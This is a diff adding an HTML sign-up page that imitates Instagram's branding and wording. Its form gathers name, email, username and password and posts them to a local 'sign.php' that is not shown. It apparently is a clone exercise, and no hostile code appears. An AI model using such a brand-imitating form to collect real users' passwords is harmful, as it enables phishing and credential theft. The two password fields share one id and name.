@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SignUp | Instagram</title>
+    <link href="sign.css" rel="stylesheet">
+</head>
+<body>
+    
+    <div class="container">
+        <picture >
+            <source media="(min-width:500px)" srcset="dp.png">
+        </picture>
+        <div class="signup">
+            <h1 >Instagram</h1>
+            <p>Sign up to see photos and videos from your friends.</p>
+            <P class="fb"><a  href="https://www.facebook.com/"  style="text-decoration: none;">Continue with facebook</a></P>
+            <p>__________ OR __________</p>
+            <form method="post" action="sign.php">
+                <div class="input">                
+                    <input type="text" id="name" name="Name" placeholder="Name" required><br>
+                </div>
+                <div class="input">                
+                    <input type="text" id="email" name="Email" placeholder="Email" required><br>
+                </div>
+                <div class="input">                
+                    <input type="text" id="username" name="Username" placeholder="Username" required><br>
+                </div>
+                <div class="input">               
+                    <input type="password" id="pwd" name="Password" placeholder="Password" required><br>
+                </div>
+                <div class="input">               
+                    <input type="password" id="pwd" name="Password" placeholder="confirm Password" required><br>
+                </div>
+                <button type="submit" class="submitbutton">SignUp</button>
+            </form>
+        </div>
+        <div class="login">
+            <p >Have an account?</p>
+            <a class="submitbtn" href="login.html" style="text-decoration: none;">Login </a>
+        </div>
+
+    </div>
+    
+</body>
+</html>
